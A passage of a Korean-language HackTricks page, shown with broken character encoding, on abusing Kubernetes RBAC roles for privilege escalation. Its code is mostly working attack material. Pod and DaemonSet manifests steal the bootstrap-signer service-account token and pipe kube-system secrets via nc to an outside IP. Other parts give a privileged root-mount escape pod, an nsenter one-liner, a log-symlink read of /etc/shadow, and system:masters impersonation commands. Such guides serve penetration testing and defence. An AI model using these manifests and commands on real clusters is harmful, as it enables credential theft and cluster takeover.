# ì¿ ë²„ë„¤í‹°ìŠ¤ì—ì„œ Roles/ClusterRoles ë‚¨ìš©í•˜ê¸°

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ë¥¼ í†µí•´ ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ë¥¼ í†µí•´!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ê³  ì‹¶ë‹¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

ì—¬ê¸°ì—ì„œ ì ì¬ì ìœ¼ë¡œ ìœ„í—˜í•œ Roles ë° ClusterRoles êµ¬ì„±ì„ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
`kubectl api-resources`ë¥¼ ì‚¬ìš©í•˜ì—¬ ëª¨ë“  ì§€ì›ë˜ëŠ” ë¦¬ì†ŒìŠ¤ë¥¼ ì–»ì„ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ê¸°ì–µí•˜ì„¸ìš”.

## **ê¶Œí•œ ìƒìŠ¹**

ì¿ ë²„ë„¤í‹°ìŠ¤ì—ì„œ **ë‹¤ë¥¸ ê¶Œí•œì„ ê°€ì§„ ë‹¤ë¥¸ ì£¼ì²´ì—ê²Œ ì•¡ì„¸ìŠ¤í•˜ëŠ” ì˜ˆìˆ **ì„ ì˜ë¯¸í•˜ëŠ” **ê¶Œí•œ ìƒìŠ¹**ìœ¼ë¡œ, ì¿ ë²„ë„¤í‹°ìŠ¤ì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **4ê°€ì§€ ì£¼ìš” ê¸°ìˆ ì„ ì‚¬ìš©í•˜ì—¬ ê¶Œí•œì„ ìƒìŠ¹**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì¿ ë²„ë„¤í‹°ìŠ¤ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œë¡œ **ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ ë‹¤ë¥¸ ì‚¬ìš©ì/ê·¸ë£¹/SAsë¥¼ í‰ë‚´ ë‚´ëŠ”** ëŠ¥ë ¥
* ì¿ ë²„ë„¤í‹°ìŠ¤ í´ëŸ¬ìŠ¤í„° ë‚´ë¶€ ë˜ëŠ” ì™¸ë¶€ í´ë¼ìš°ë“œë¡œ **ë” ë‚˜ì€ ê¶Œí•œì„ ê°€ì§„ SAsë¥¼ ì°¾ê±°ë‚˜ ì—°ê²°í•  ìˆ˜ ìˆëŠ”** **íŒŸì„ ìƒì„±/íŒ¨ì¹˜/ì‹¤í–‰**í•˜ëŠ” ëŠ¥ë ¥
* SAs í† í°ì´ ë¹„ë°€ë¡œ ì €ì¥ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— **ë¹„ë°€ì„ ì½ì„ ìˆ˜ ìˆëŠ”** ëŠ¥ë ¥
* **ì»¨í…Œì´ë„ˆì—ì„œ ë…¸ë“œë¡œ íƒˆì¶œ**í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ìœ¼ë¡œ, ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆì˜ ëª¨ë“  ë¹„ë°€, ë…¸ë“œì˜ ìê²© ì¦ëª… ë° í´ë¼ìš°ë“œ ë‚´ì—ì„œ ë…¸ë“œì˜ ê¶Œí•œì„ ë„ë‚œë‹¹í•  ìˆ˜ ìˆìŒ
* íŒŸì—ì„œ **í¬íŠ¸ í¬ì›Œë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ìœ¼ë¡œ, í•´ë‹¹ íŒŸ ë‚´ì˜ í¥ë¯¸ë¡œìš´ ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆì„ ìˆ˜ ìˆìŒ.

### ëª¨ë“  ë¦¬ì†ŒìŠ¤ ë˜ëŠ” ë™ì‚¬ì— ì•¡ì„¸ìŠ¤ (ì™€ì¼ë“œì¹´ë“œ)

**ì™€ì¼ë“œì¹´ë“œ (\*)ëŠ” ëª¨ë“  ë¦¬ì†ŒìŠ¤ì— ëŒ€í•œ ëª¨ë“  ë™ì‚¬ ê¶Œí•œì„ ë¶€ì—¬**í•©ë‹ˆë‹¤. ê´€ë¦¬ìê°€ ì‚¬ìš©í•©ë‹ˆë‹¤. ClusterRole ë‚´ë¶€ì—ì„œ ì´ëŠ” ê³µê²©ìê°€ í´ëŸ¬ìŠ¤í„° ë‚´ì˜ ëª¨ë“  ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ë‚¨ìš©í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ì˜ë¯¸í•©ë‹ˆë‹¤.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### íŠ¹ì • ë™ì‚¬ë¡œ ëª¨ë“  ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ê¸°

RBACì—ì„œ íŠ¹ì • ê¶Œí•œì€ ì¤‘ëŒ€í•œ ìœ„í—˜ì„ ì•¼ê¸°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

1. **`create`:** ì–´ë–¤ í´ëŸ¬ìŠ¤í„° ë¦¬ì†ŒìŠ¤ë“  ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ë¶€ì—¬í•˜ì—¬ ê¶Œí•œ ìƒìŠ¹ì„ ìœ„í˜‘í•©ë‹ˆë‹¤.
2. **`list`:** ëª¨ë“  ë¦¬ì†ŒìŠ¤ë¥¼ ë‚˜ì—´í•  ìˆ˜ ìˆëŠ” ê¶Œí•œìœ¼ë¡œ ë¯¼ê°í•œ ë°ì´í„° ëˆ„ì¶œ ê°€ëŠ¥ì„±ì´ ìˆìŠµë‹ˆë‹¤.
3. **`get`:** ì„œë¹„ìŠ¤ ê³„ì •ì—ì„œ ë¹„ë°€ì„ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆê²Œ í—ˆìš©í•˜ì—¬ ë³´ì•ˆ ìœ„í˜‘ì„ ì•¼ê¸°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod ìƒì„± - í† í° ë„ìš©

Podë¥¼ ìƒì„±í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” íŠ¹ê¶Œì´ ìˆëŠ” ì„œë¹„ìŠ¤ ê³„ì •ì„ Podì— ì²¨ë¶€í•˜ì—¬ í† í°ì„ ë„ìš©í•˜ê³  ì„œë¹„ìŠ¤ ê³„ì •ì„ ê°€ì¥í•˜ëŠ” ê²ƒìœ¼ë¡œ ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³µê²©ìì—ê²Œ í† í°ì„ ì „ì†¡í•  `bootstrap-signer` ì„œë¹„ìŠ¤ ê³„ì •ì˜ í† í°ì„ ë„ìš©í•˜ëŠ” Podì˜ ì˜ˆì‹œ:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod ìƒì„± ë° ì´ìŠ¤ì¼€ì´í”„

ë‹¤ìŒì€ ì»¨í…Œì´ë„ˆê°€ ê°€ì§ˆ ìˆ˜ ìˆëŠ” ëª¨ë“  ê¶Œí•œì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤:

- **íŠ¹ê¶Œ ì•¡ì„¸ìŠ¤** (ë³´í˜¸ ê¸°ëŠ¥ ë¹„í™œì„±í™” ë° ê¸°ëŠ¥ ì„¤ì •)
- **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ í˜¸ìŠ¤íŠ¸ IPC ë° í˜¸ìŠ¤íŠ¸ PID ë¹„í™œì„±í™”**ë¡œ ê¶Œí•œ ìƒìŠ¹ì— ë„ì›€ì„ ì¤„ ìˆ˜ ìˆìŒ
- **í˜¸ìŠ¤íŠ¸ ë„¤íŠ¸ì›Œí¬ ë¹„í™œì„±í™”** ë„¤ì„ìŠ¤í˜ì´ìŠ¤, ë…¸ë“œ í´ë¼ìš°ë“œ ê¶Œí•œì„ í›”ì¹˜ê³  ë„¤íŠ¸ì›Œí¬ì— ë” ë‚˜ì€ ì•¡ì„¸ìŠ¤ ê¶Œí•œ ë¶€ì—¬
- **ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì— í˜¸ìŠ¤íŠ¸ / ë§ˆìš´íŠ¸**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

ë‹¤ìŒê³¼ ê°™ì´ podë¥¼ ìƒì„±í•˜ì‹­ì‹œì˜¤:
```bash
kubectl --token $token create -f mount_root.yaml
```
[ì´ íŠ¸ìœ—](https://twitter.com/mauilion/status/1129468485480751104)ì—ì„œì˜ í•œ ì¤„ê³¼ ëª‡ ê°€ì§€ ì¶”ê°€ ì‚¬í•­:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
#### ì€ì‹ 

ì•„ë§ˆë„ ë” **ì€ë°€í•˜ê²Œ** ì›€ì§ì´ê³  ì‹¶ì„ ê²ƒì…ë‹ˆë‹¤. ì´ì „ í…œí”Œë¦¿ì—ì„œ ì–¸ê¸‰ëœ íŠ¹ê¶Œ ì¤‘ ì¼ë¶€ë§Œ í™œì„±í™”í•˜ì—¬ íŒŒë“œë¥¼ ìƒì„±í•˜ë©´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ” ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- **Privileged + hostPID**
- **Privileged only**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_ì´ì „ íŠ¹ê¶Œì´ ë¶€ì—¬ëœ íŒŒë“œ êµ¬ì„±ì„ ìƒì„±/ë‚¨ìš©í•˜ëŠ” ì˜ˆì œëŠ”_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤._

### íŒŒë“œ ìƒì„± - í´ë¼ìš°ë“œë¡œ ì´ë™

**íŒŒë“œ** (ë° ì„ íƒì ìœ¼ë¡œ **ì„œë¹„ìŠ¤ ê³„ì •**)ë¥¼ **ìƒì„±**í•  ìˆ˜ ìˆë‹¤ë©´ **íŒŒë“œë‚˜ ì„œë¹„ìŠ¤ ê³„ì •ì— í´ë¼ìš°ë“œ ì—­í• ì„ í• ë‹¹**í•œ ë‹¤ìŒ ì•¡ì„¸ìŠ¤í•˜ì—¬ **í´ë¼ìš°ë“œ í™˜ê²½ì—ì„œ íŠ¹ê¶Œì„ íšë“**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ **í˜¸ìŠ¤íŠ¸ ë„¤íŠ¸ì›Œí¬ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŒë“œë¥¼ ìƒì„±**í•  ìˆ˜ ìˆë‹¤ë©´ **ë…¸ë“œ** ì¸ìŠ¤í„´ìŠ¤ì˜ **IAM ì—­í• ì„ íƒˆì·¨**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ìì„¸í•œ ì •ë³´ëŠ” í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **ë°°í¬, ë°ëª¬ì…‹, ìŠ¤í…Œì´íŠ¸í’€ì…‹, ë³µì œì»¨íŠ¸ë¡¤ëŸ¬, ë ˆí”Œë¦¬ì¹´ì…‹, ì‘ì—… ë° í¬ë¡ ì¡ ìƒì„±/íŒ¨ì¹˜**

ì´ëŸ¬í•œ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ **ìƒˆë¡œìš´ íŒŒë“œë¥¼ ìƒì„±**í•˜ê³  ì´ì „ ì˜ˆì œì™€ ê°™ì´ íŠ¹ê¶Œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë‹¤ìŒ YAMLì€ **ë°ëª¬ì…‹ì„ ìƒì„±í•˜ê³  íŒŒë“œ ë‚´ë¶€ì˜ SA í† í°ì„ ìœ ì¶œ**í•©ë‹ˆë‹¤:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`**ì€ ì¿ ë²„ë„¤í‹°ìŠ¤ì—ì„œ **íŒŸ ë‚´ë¶€ì˜ ì‰˜ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” ë¦¬ì†ŒìŠ¤**ì…ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ **ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê±°ë‚˜ ì‰˜ì— ë“¤ì–´ê°ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ë”°ë¼ì„œ **íŒŸ ë‚´ë¶€ë¡œ ë“¤ì–´ê°€ SAì˜ í† í°ì„ í›”ì¹˜ê±°ë‚˜ íŠ¹ê¶Œì´ ìˆëŠ” íŒŸì— ë“¤ì–´ê°€ ë…¸ë“œë¡œ ì´íƒˆí•˜ì—¬ ë…¸ë“œ ë‚´ì˜ ëª¨ë“  íŒŸì˜ í† í°ì„ í›”ì¹  ìˆ˜ ìˆê³  ë…¸ë“œë¥¼ (ë‚¨ìš©)í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### í¬íŠ¸ í¬ì›Œë“œ

ì´ ê¶Œí•œì€ **ë¡œì»¬ í¬íŠ¸ë¥¼ ì§€ì •ëœ íŒŸ ë‚´ì˜ í¬íŠ¸ë¡œ ì „ë‹¬í•˜ëŠ” ê²ƒì„ í—ˆìš©**í•©ë‹ˆë‹¤. ì´ëŠ” íŒŸ ë‚´ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‰½ê²Œ ë””ë²„ê¹…í•  ìˆ˜ ìˆë„ë¡ í•˜ëŠ” ê²ƒì„ ì˜ë„í–ˆì§€ë§Œ, ê³µê²©ìëŠ” íŒŸ ë‚´ì˜ í¥ë¯¸ë¡œìš´(ì˜ˆ: DB) ë˜ëŠ” ì·¨ì•½í•œ ì• í”Œë¦¬ì¼€ì´ì…˜(ì›¹?)ì— ì•¡ì„¸ìŠ¤í•˜ê¸° ìœ„í•´ ì´ë¥¼ ë‚¨ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
kubectl port-forward pod/mypod 5000:5000
```
### í˜¸ìŠ¤íŠ¸ ì“°ê¸° ê°€ëŠ¥ /var/log/ íƒˆì¶œ

[**ì´ ì—°êµ¬ì—ì„œ ë‚˜íƒ€ë‚œ ê²ƒ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ëŒ€ë¡œ, **í˜¸ìŠ¤íŠ¸ì˜ `/var/log/` ë””ë ‰í† ë¦¬ê°€ ë§ˆìš´íŠ¸ëœ** íŒŸì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ ìƒì„±í•  ìˆ˜ ìˆë‹¤ë©´, **ì»¨í…Œì´ë„ˆì—ì„œ íƒˆì¶œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **Kube-APIê°€ ì»¨í…Œì´ë„ˆì˜ ë¡œê·¸ë¥¼ ê°€ì ¸ì˜¤ë ¤ê³  í•  ë•Œ** (`kubectl logs <pod>`ë¥¼ ì‚¬ìš©í•¨) **Kubelet** ì„œë¹„ìŠ¤ì˜ `/logs/` ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ íŒŸì˜ `0.log` íŒŒì¼ì„ ìš”ì²­í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.\
Kubelet ì„œë¹„ìŠ¤ëŠ” ì»¨í…Œì´ë„ˆì˜ `/var/log` íŒŒì¼ ì‹œìŠ¤í…œì„ ë…¸ì¶œí•˜ëŠ” `/logs/` ì—”ë“œí¬ì¸íŠ¸ë¥¼ ë…¸ì¶œí•©ë‹ˆë‹¤.

ë”°ë¼ì„œ, **ì»¨í…Œì´ë„ˆì˜ /var/log/ í´ë”ì— ì“°ê¸° ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆëŠ” ê³µê²©ìëŠ” ë‹¤ìŒ 2ê°€ì§€ ë°©ë²•ìœ¼ë¡œ ì´ëŸ¬í•œ ë™ì‘ì„ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì¼ë°˜ì ìœ¼ë¡œ `/var/logs/pods/namespace_pod_uid/container/0.log`ì— ìœ„ì¹˜í•œ ì»¨í…Œì´ë„ˆì˜ `0.log` íŒŒì¼ì„ **`/etc/shadow`ë¥¼ ê°€ë¦¬í‚¤ëŠ” ì‹¬ë³¼ë¦­ ë§í¬**ë¡œ ìˆ˜ì •í•©ë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ, ë‹¤ìŒì„ ìˆ˜í–‰í•˜ì—¬ í˜¸ìŠ¤íŠ¸ì˜ shadow íŒŒì¼ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* ë§Œì•½ ê³µê²©ìê°€ `nodes/log`ë¥¼ ì½ì„ ìˆ˜ ìˆëŠ” ê¶Œí•œì„ ê°€ì§„ ì£¼ì²´ë¥¼ ì œì–´í•œë‹¤ë©´, `/host-mounted/var/log/sym`ì— `/`ë¡œì˜ **ì‹¬ë³¼ë¦­ ë§í¬**ë¥¼ ë§Œë“¤ê³ , `https://<gateway>:10250/logs/sym/`ì— ì ‘ê·¼í•  ë•Œ í˜¸ìŠ¤íŠ¸ì˜ ë£¨íŠ¸ íŒŒì¼ ì‹œìŠ¤í…œì„ ë‚˜ì—´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì‹¬ë³¼ë¦­ ë§í¬ë¥¼ ë³€ê²½í•˜ë©´ íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŒ).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**í•´ë‹¹ ì‹¤í—˜ì‹¤ê³¼ ìë™í™”ëœ ì•…ìš©ì€** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### readOnly ë³´í˜¸ ìš°íšŒ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

ì¶©ë¶„íˆ ìš´ì´ ì¢‹ê³  ê³ ë„ë¡œ ê¶Œí•œì´ ë¶€ì—¬ëœ `CAP_SYS_ADMIN` ê¸°ëŠ¥ì´ ì‚¬ìš© ê°€ëŠ¥í•œ ê²½ìš°, í´ë”ë¥¼ ê°„ë‹¨íˆ ì½ê¸°/ì“°ê¸°ë¡œ ë‹¤ì‹œ ë§ˆìš´íŠ¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
mount -o rw,remount /hostlogs/
```
#### hostPath ì½ê¸° ì „ìš© ë³´í˜¸ ê¸°ëŠ¥ ìš°íšŒ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**ì´ ì—°êµ¬**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ì—ì„œ ì–¸ê¸‰ëœ ëŒ€ë¡œ ì´ ë³´í˜¸ ê¸°ëŠ¥ì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
ë‹¤ìŒì€ ì´ì „ê³¼ ê°™ì€ íƒˆì¶œì„ ë°©ì§€í•˜ê¸° ìœ„í•´ hostPath ë§ˆìš´íŠ¸ ëŒ€ì‹  PersistentVolume ë° PersistentVolumeClaimì„ ì‚¬ìš©í•˜ì—¬ í˜¸ìŠ¤íŠ¸ í´ë”ë¥¼ ì»¨í…Œì´ë„ˆì— ì“°ê¸° ì•¡ì„¸ìŠ¤ë¡œ ë§ˆìš´íŠ¸í•˜ëŠ” ê²ƒì„ ì˜ë¯¸í–ˆìŠµë‹ˆë‹¤:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **íŠ¹ê¶Œ ê³„ì • ìœ„ì¥**

[**ì‚¬ìš©ì ìœ„ì¥**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) ê¶Œí•œì„ ì‚¬ìš©í•˜ë©´ ê³µê²©ìê°€ íŠ¹ê¶Œ ê³„ì •ìœ¼ë¡œ ìœ„ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`kubectl` ëª…ë ¹ì–´ì—ì„œ `--as=<username>` ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‚¬ìš©ìë¡œ ìœ„ì¥í•˜ê±°ë‚˜, `--as-group=<group>`ì„ ì‚¬ìš©í•˜ì—¬ ê·¸ë£¹ìœ¼ë¡œ ìœ„ì¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
ë˜ëŠ” REST APIë¥¼ ì‚¬ìš©í•˜ì‹­ì‹œì˜¤:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ë¹„ë°€ ëª©ë¡

**ë¹„ë°€ì„ ë‚˜ì—´í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì€ ê³µê²©ìê°€ REST API ì—”ë“œí¬ì¸íŠ¸ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ ë¹„ë°€ì„ ì‹¤ì œë¡œ ì½ì„ ìˆ˜ ìˆê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ì‹œí¬ë¦¿ ì½ê¸° - í† í° ID ë¸Œë£¨íŠ¸í¬ì‹±

ì½ê¸° ê¶Œí•œì´ ìˆëŠ” í† í°ì„ ì†Œìœ í•œ ê³µê²©ìëŠ” í•´ë‹¹ ì‹œí¬ë¦¿ì˜ ì •í™•í•œ ì´ë¦„ì„ ì‚¬ìš©í•´ì•¼ í•˜ì§€ë§Œ, ë” ë„“ì€ **ì‹œí¬ë¦¿ ëª©ë¡** ê¶Œí•œê³¼ëŠ” ë‹¬ë¦¬ ì·¨ì•½ì ì´ ì—¬ì „íˆ ì¡´ì¬í•©ë‹ˆë‹¤. ì‹œìŠ¤í…œì˜ ê¸°ë³¸ ì„œë¹„ìŠ¤ ê³„ì •ì€ ì—´ê±°ë  ìˆ˜ ìˆìœ¼ë©°, ê°ê°ì´ ì‹œí¬ë¦¿ê³¼ ì—°ê´€ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ì‹œí¬ë¦¿ì€ ì •ì  ì ‘ë‘ì‚¬ ë’¤ì— ë¬´ì‘ìœ„ ë‹¤ì„¯ ìë¦¬ ì•ŒíŒŒë²³ ë° ìˆ«ì í† í°(íŠ¹ì • ë¬¸ì ì œì™¸)ìœ¼ë¡œ êµ¬ì„±ëœ ì´ë¦„ êµ¬ì¡°ë¥¼ ê°€ì§€ê³  ìˆìŠµë‹ˆë‹¤. ì´ í† í°ì€ [ì†ŒìŠ¤ 